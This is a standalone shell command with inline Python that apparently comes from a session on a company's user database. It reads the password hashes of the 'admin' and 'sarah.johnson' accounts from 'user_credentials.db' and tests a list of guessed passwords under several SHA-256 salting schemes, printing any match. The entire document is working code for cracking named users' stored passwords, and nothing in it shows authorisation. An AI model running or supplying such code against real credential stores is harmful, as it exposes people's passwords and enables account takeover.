python3 -c "
import hashlib, sqlite3
conn = sqlite3.connect('user_credentials.db')
rows = conn.execute('SELECT username, email, password_hash FROM users WHERE username IN (\"admin\",\"sarah.johnson\")').fetchall()
conn.close()
cands = ['admin123','password123','Password123!','techcorp','TechCorp2024','admin@techcorp.com','password','12345678']
for uname, email, h in rows:
    for c in cands:
        variants = {
            'sha256(pw)': hashlib.sha256(c.encode()).hexdigest(),
            'sha256(user+pw)': hashlib.sha256((uname+c).encode()).hexdigest(),
            'sha256(pw+user)': hashlib.sha256((c+uname).encode()).hexdigest(),
            'sha256(email+pw)': hashlib.sha256((email+c).encode()).hexdigest(),
            'sha256(user+pw,iter1)': hashlib.sha256((uname+c).encode()).hexdigest(),
        }
        for name, hv in variants.items():
            if hv == h:
                print('MATCH', uname, name, c)
print('done probing')
"
